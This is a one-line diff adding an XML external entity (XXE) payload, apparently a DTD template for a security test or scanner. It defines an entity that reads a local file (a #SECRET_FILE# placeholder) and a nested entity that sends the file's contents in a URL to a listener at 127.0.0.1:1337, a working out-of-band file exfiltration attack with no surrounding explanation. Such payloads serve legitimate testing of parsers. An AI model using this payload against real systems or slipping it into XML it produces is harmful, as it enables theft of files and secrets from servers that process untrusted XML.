@@ -1,0 +1,1 @@
+<!ENTITY % file SYSTEM "file:///#SECRET_FILE#"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:1337/?x=%file;'>">%eval;%exfiltrate;
